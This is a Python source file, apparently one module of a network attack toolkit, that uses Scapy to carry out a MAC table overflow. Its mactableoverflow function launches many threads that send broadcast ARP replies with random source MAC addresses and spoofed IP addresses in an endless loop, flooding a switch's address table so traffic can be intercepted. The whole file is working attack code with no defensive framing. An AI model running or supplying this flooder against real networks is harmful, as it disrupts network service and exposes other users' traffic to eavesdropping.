from scapy.all import *
from func.spoof_addr import spoof_addr
from func.random_mac import random_mac
from time import sleep
import threading

def mactableoverflow(THREAD_COUNT,quiet,terminal = None):
    try:
        all_threads=[]
        if terminal == None:
            print("[+] Overflowing MAC table...")
        else:
            terminal.write('\n[+] Overflowing MAC table')
        for i in range(int(THREAD_COUNT)):
            t = threading.Thread(target=__send_macs,args=(quiet,terminal))
            t.daemon=True
            all_threads.append(t)

        for i in all_threads:
            i.start()
        
        all_threads[0].join()
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))

def __send_macs(quiet,terminal):
    try:
        spoofaddr=spoof_addr(terminal=terminal)
        packet = Ether(src=random_mac(),dst='ff:ff:ff:ff:ff:ff')/ARP(op=2,psrc=spoofaddr,hwdst='ff:ff:ff:ff:ff:ff')
        while True:
            send(packet,verbose=0)
            if not quiet:
                if terminal == None:
                    print("[+] Packet successfully sent\n[+] Packet: "+packet.summary())     
                else:
                    terminal.write('\n[+] Packet successfully sent \n[+] Packet: '+packet.summary())
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))
